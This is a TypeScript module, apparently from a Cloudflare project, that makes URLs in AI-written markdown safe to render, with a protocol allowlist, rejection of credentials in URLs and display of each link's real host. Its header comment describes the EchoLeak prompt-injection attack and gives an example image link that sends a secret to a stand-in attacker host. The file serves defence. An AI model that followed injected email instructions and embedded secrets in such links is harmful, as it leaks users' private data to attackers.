// Copyright (c) 2026 Cloudflare, Inc.
// Licensed under the Apache 2.0 license found in the LICENSE file or at:
//     https://opensource.org/licenses/Apache-2.0

/**
 * URL handling for text a model wrote.
 *
 * Model output can be steered by any email the model read, so a link or image
 * in it is attacker-chosen. The EchoLeak pattern (CVE-2025-32711) is a reply
 * containing `![](https://attacker/?q=<secret>)`: the browser fetches the image
 * the moment it renders, and the query string carries whatever the model was
 * tricked into putting there. No click needed.
 *
 * So model output never loads anything by itself: images become a labelled
 * link, and links are limited to http, https and mailto, each shown with the
 * real host beside it so a "your bank" label cannot hide where it goes.
 */

const ALLOWED_PROTOCOLS = new Set(["http:", "https:", "mailto:"]);

/**
 * The href to render, or null when the URL must not be a link.
 *
 * Relative URLs are refused too: in the app's origin they would reach this
 * app's own routes with the user's cookies.
 */
export function safeHref(raw: string | null | undefined): string | null {
	if (typeof raw !== "string") return null;
	const value = raw.trim();
	if (!value) return null;
	let url: URL;
	try {
		url = new URL(value);
	} catch {
		return null;
	}
	if (!ALLOWED_PROTOCOLS.has(url.protocol)) return null;
	if (url.protocol !== "mailto:" && !url.hostname) return null;
	// Credentials in a URL are a classic way to fake the visible host.
	if (url.username || url.password) return null;
	return url.href;
}

/**
 * What to show beside a link so its destination cannot be disguised: the
 * hostname (punycode left as-is, which is what makes a lookalike visible), or
 * the address for mailto.
 */
export function linkDestination(href: string): string {
	try {
		const url = new URL(href);
		if (url.protocol === "mailto:") return decodeURIComponent(url.pathname).split("?")[0] || "email";
		return url.hostname;
	} catch {
		return "";
	}
}

/**
 * `react-markdown`'s `urlTransform`: everything not on the allowlist becomes an
 * empty string, which the components below then render as plain text.
 */
export function markdownUrlTransform(url: string): string {
	return safeHref(url) ?? "";
}
